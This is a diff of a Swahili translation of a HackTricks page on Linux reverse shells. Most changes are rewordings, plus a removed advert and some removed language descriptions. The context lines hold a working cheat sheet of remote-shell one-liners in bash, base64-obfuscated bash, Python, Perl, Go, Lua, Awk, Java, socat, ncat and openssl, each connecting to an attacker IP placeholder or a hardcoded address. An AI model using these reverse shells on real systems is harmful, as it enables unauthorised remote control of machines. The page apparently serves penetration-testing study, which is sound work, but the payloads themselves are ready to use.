@@ -1,4 +1,4 @@
-# Mabua - Linux
+# Mabakuli - Linux
 
 <details>
 
@@ -14,11 +14,11 @@ Njia nyingine za kusaidia HackTricks:
 
 </details>
 
-**Ikiwa una maswali kuhusu mabua haya unaweza kuyachunguza kwa** [**https://explainshell.com/**](https://explainshell.com)
+**Ikiwa una maswali kuhusu mabakuli haya unaweza kuyachunguza kwa** [**https://explainshell.com/**](https://explainshell.com)
 
 ## TTY Kamili
 
-**Maradhi unapopata mabua ya kinyume**[ **soma ukurasa huu ili upate TTY kamili**](full-ttys.md)**.**
+**Maradhi unapopata mabakuli ya kurudi**[ **soma ukurasa huu ili kupata TTY kamili**](full-ttys.md)**.**
 
 ## Bash | sh
 ```bash
@@ -33,9 +33,9 @@ exec 5<>/dev/tcp/<ATTACKER-IP>/<PORT>; while read line 0<&5; do $line 2>&5 >&5; 
 #after getting the previous shell to get the output to execute
 exec >&0
 ```
-Usisahau kuangalia na mabaka mengine: sh, ash, bsh, csh, ksh, zsh, pdksh, tcsh, na bash.
+Usisahau kuchunguza na mabaka mengine: sh, ash, bsh, csh, ksh, zsh, pdksh, tcsh, na bash.
 
-### Baka Salama ya Alama
+### Baka salama ya alama
 ```bash
 #If you need a more stable connection do:
 bash -c 'bash -i >& /dev/tcp/<ATTACKER-IP>/<PORT> 0>&1'
@@ -49,8 +49,8 @@ echo bm9odXAgYmFzaCAtYyAnYmFzaCAtaSA+JiAvZGV2L3RjcC8xMC44LjQuMTg1LzQ0NDQgMD4mMSc
 1. **`bash -i`**: Sehemu hii ya amri inaanza shell ya Bash ya mwingiliano (`-i`).
 2. **`>&`**: Sehemu hii ya amri ni maelezo ya mkato kwa **kupelekeza pato la kawaida** (`stdout`) na **makosa ya kawaida** (`stderr`) kwa **mahali sawa**.
 3. **`/dev/tcp/<ATTACKER-IP>/<PORT>`**: Hii ni faili maalum inayowakilisha **unganisho la TCP kwa anwani ya IP iliyotajwa na bandari**.
-* Kwa **kupelekeza matokeo na mito ya makosa kwa faili hii**, amri inatuma kimsingi pato la kikao cha shell ya mwingiliano kwenye mashine ya mshambuliaji.
-4. **`0>&1`**: Sehemu hii ya amri **inapelekeza kiingizo cha kawaida (`stdin`) kwa mahali sawa na pato la kawaida (`stdout`)**.
+* Kwa **kupelekeza pato na mizizi ya makosa kwa faili hii**, amri inatuma kimsingi pato la kikao cha shell ya mwingiliano kwenye mashine ya mshambuliaji.
+4. **`0>&1`**: Sehemu hii ya amri **inapelekeza kuingia kawaida (`stdin`) kwa mahali sawa na pato la kawaida (`stdout`)**.
 
 ### Unda kwenye faili na tekeleza
 ```bash
@@ -65,11 +65,11 @@ Unaweza kupata nambari katika [**https://github.com/IppSec/forward-shell**](http
 
 Unahitaji tu kurekebisha:
 
-* URL ya mwenyeji anayeweza kudhurika
+* URL ya mwenyeji mwenye udhaifu
 * Kiambishi na kielezi cha mzigo wako (ikiwa ipo)
 * Namna mzigo unavyotumwa (vichwa? data? habari ziada?)
 
-Kisha, unaweza tu **kutuma amri** au hata **kutumia amri ya `upgrade`** kupata PTY kamili (kumbuka kuwa mabomba husomwa na kuandikwa kwa kucheleweshwa kwa takriban sekunde 1.3).
+Kisha, unaweza tu **kutuma amri** au hata **kutumia amri ya `upgrade`** kupata PTY kamili (kumbuka kuwa mabomba husomwa na kuandikwa kwa kuchelewa kwa takriban sekunde 1.3).
 
 ## Netcat
 ```bash
@@ -102,13 +102,11 @@ while true; do nc -l <port>; done
 ```
 Kutuma amri andika chini, bonyeza 'enter' na bonyeza CTRL+D (kusimamisha STDIN)
 
-**Mnajimu**
+**Mnajisi**
 ```bash
 export X=Connected; while true; do X=`eval $(whois -h <IP> -p <Port> "Output: $X")`; sleep 1; done
 ```
 ## Python
-
-## Kipanya
 ```bash
 #Linux
 export RHOST="127.0.0.1";export RPORT=12345;python -c 'import sys,socket,os,pty;s=socket.socket();s.connect((os.getenv("RHOST"),int(os.getenv("RPORT"))));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn("/bin/sh")'
@@ -117,8 +115,6 @@ python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOC
 python -c 'import socket,subprocess,os,pty;s=socket.socket(socket.AF_INET6,socket.SOCK_STREAM);s.connect(("dead:beef:2::125c",4343,0,2));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=pty.spawn("/bin/sh");'
 ```
 ## Perl
-
-Perl ni lugha ya programu ambayo inaweza kutumika kwa ufanisi kama shell ya kuingiliana. Inaweza kufanya kazi kama chombo cha kutekeleza amri za mfumo na pia kama lugha ya scripting. Perl ina mifumo mingi ya shell ambayo inaweza kutumika kwa ufanisi kwa shughuli za uingiliano wa mtumiaji.
 ```bash
 perl -e 'use Socket;$i="<ATTACKER-IP>";$p=80;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'
 perl -MIO -e '$p=fork;exit,if($p);$c=new IO::Socket::INET(PeerAddr,"[IPADDR]:[PORT]");STDIN->fdopen($c,r);$~->fdopen($c,w);system$_ while<>;'
@@ -153,21 +149,13 @@ p.waitFor()
 victim> ncat --exec cmd.exe --allow 10.0.0.4 -vnl 4444 --ssl
 attacker> ncat -v 10.0.0.22 4444 --ssl
 ```
-<figure><img src="../../.gitbook/assets/image (675).png" alt=""><figcaption></figcaption></figure>
-
-Pata mapungufu yanayojali zaidi ili uweze kuyasuluhisha haraka. Mvamizi hufuatilia eneo lako la mashambulizi, hufanya uchunguzi wa vitisho wa kujitolea, hupata matatizo katika safu yako nzima ya teknolojia, kutoka kwa APIs hadi programu za wavuti na mifumo ya wingu. [**Jaribu bure**](https://www.intruder.io/?utm\_source=referral\&utm\_campaign=hacktricks) leo.
-
-{% embed url="https://www.intruder.io/?utm_campaign=hacktricks&utm_source=referral" %}
-
-***
-
 ## Golang
 ```bash
 echo 'package main;import"os/exec";import"net";func main(){c,_:=net.Dial("tcp","192.168.0.134:8080");cmd:=exec.Command("/bin/sh");cmd.Stdin=c;cmd.Stdout=c;cmd.Stderr=c;cmd.Run()}' > /tmp/t.go && go run /tmp/t.go && rm /tmp/t.go
 ```
 ## Lua
 
-Lua ni lugha ya programu ya scripting inayotumika sana kwa madhumuni anuwai, ikiwa ni pamoja na maendeleo ya michezo na programu za wavuti. Lua inaweza kuingizwa kwenye programu zingine na inaweza kutumika kama sehemu ya mifumo mikubwa zaidi. Lua inajulikana kwa urahisi wake wa kujifunza na utendaji wake wa haraka.
+Lua ni lugha ya programu ya scripting inayotumika sana kwa madhumuni anuwai ikiwa ni pamoja na maendeleo ya michezo, automatiseringi, na hata uundaji wa wavuti. Lua inajulikana kwa urahisi wake wa kujifunza na kutumia, pamoja na uwezo wake wa kuingizwa kwenye programu zingine kama sehemu ya scripting. Lua inaweza kutumika kama sehemu ya mchakato wa uchambuzi wa mazingira ya lengo.
 ```bash
 #Linux
 lua -e "require('socket');require('os');t=socket.tcp();t:connect('10.0.0.1','1234');os.execute('/bin/sh -i <&3 >&3 2>&3');"
@@ -225,7 +213,7 @@ openssl req -x509 -newkey rsa:4096 -keyout key.pem -out cert.pem -days 365 -node
 openssl s_server -quiet -key key.pem -cert cert.pem -port <l_port> #Here you will be able to introduce the commands
 openssl s_server -quiet -key key.pem -cert cert.pem -port <l_port2> #Here yo will be able to get the response
 ```
-Mnufaiki
+Mkono wa Kwanza
 ```bash
 #Linux
 openssl s_client -quiet -connect <ATTACKER_IP>:<PORT1>|/bin/bash|openssl s_client -quiet -connect <ATTACKER_IP>:<PORT2>
@@ -251,17 +239,17 @@ victim> socat TCP4:<attackers_ip>:1337 EXEC:bash,pty,stderr,setsid,sigint,sane
 ```
 ## Awk
 
-Awk ni lugha ya programu iliyoundwa haswa kwa uchambuzi wa maandishi. Inaweza kutumika kama sehemu ya mnyororo wa zana za uchambuzi wa data kwenye mifumo ya Unix. Awk inaweza kusoma na kuchambua faili za maandishi kwa urahisi, na inaweza kutumiwa kwa ufanisi katika kuchuja na kuchakata data.
+Awk ni lugha ya programu iliyoundwa hasa kwa ajili ya kuchambua na kuchakata maandishi kwa kina. Inaweza kutumika kama sehemu ya mnyororo wa zana za kuchakata data kwenye mifumo ya Unix. Awk inaweza kutumika kwa urahisi kwenye terminal kama sehemu ya mchakato wa uchambuzi wa data.
 ```bash
 awk 'BEGIN {s = "/inet/tcp/0/<IP>/<PORT>"; while(42) { do{ printf "shell>" |& s; s |& getline c; if(c){ while ((c |& getline) > 0) print $0 |& s; close(c); } } while(c != "exit") close(s); }}' /dev/null
 ```
 ## Kidole
 
-**Mvamizi**
+**Mshambuliaji**
 ```bash
 while true; do nc -l 79; done
 ```
-Kutuma amri andika chini, bonyeza 'enter' na bonyeza CTRL+D (kukomesha STDIN)
+Kutuma amri andika chini, bonyeza 'enter' na bonyeza CTRL+D (kusimamisha STDIN)
 
 **Mnajisi**
 ```bash
@@ -271,7 +259,7 @@ export X=Connected; while true; do X=`eval $(finger "$X"@<IP> 2> /dev/null | gre
 ```
 ## Gawk
 
-Gawk ni chombo cha nguvu cha kutumia katika mazingira ya Unix/Linux kwa kuchambua na kufanya kazi na data muundo wa maandishi. Inaweza kutumika kama sehemu ya mnyororo wa amri au kwa kujitegemea kama programu ya skripti. Gawk inaweza kutumika kwa ufanisi kwa kuchuja, kuchambua, na kubadilisha data ya maandishi kwa njia ya kipekee.
+## Gawk
 ```bash
 #!/usr/bin/gawk -f
 
@@ -325,14 +313,14 @@ Process p=new ProcessBuilder(cmd).redirectErrorStream(true).start();Socket s=new
 
 <details>
 
-<summary><strong>Jifunze kuhusu kudukua AWS kutoka sifuri hadi shujaa na</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>
+<summary><strong>Jifunze kuhusu kuvamia AWS kutoka sifuri hadi shujaa na</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>
 
 Njia nyingine za kusaidia HackTricks:
 
 * Ikiwa unataka kuona **kampuni yako ikitangazwa kwenye HackTricks** au **kupakua HackTricks kwa PDF** Angalia [**MIPANGO YA KUJIUNGA**](https://github.com/sponsors/carlospolop)!
 * Pata [**bidhaa rasmi za PEASS & HackTricks**](https://peass.creator-spring.com)
-* Gundua [**Familia ya PEASS**](https://opensea.io/collection/the-peass-family), mkusanyiko wetu wa [**NFTs**](https://opensea.io/collection/the-peass-family) za kipekee
+* Gundua [**Familia ya PEASS**](https://opensea.io/collection/the-peass-family), mkusanyiko wetu wa [**NFTs**](https://opensea.io/collection/the-peass-family) ya kipekee
 * **Jiunge na** 💬 [**Kikundi cha Discord**](https://discord.gg/hRep4RUj7f) au kikundi cha [**telegram**](https://t.me/peass) au **tufuate** kwenye **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
-* **Shiriki mbinu zako za kudukua kwa kuwasilisha PRs kwa** [**HackTricks**](https://github.com/carlospolop/hacktricks) na [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) repos za github.
+* **Shiriki mbinu zako za kuvamia kwa kuwasilisha PRs kwa** [**HackTricks**](https://github.com/carlospolop/hacktricks) na [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) repos za github.
 
 </details>
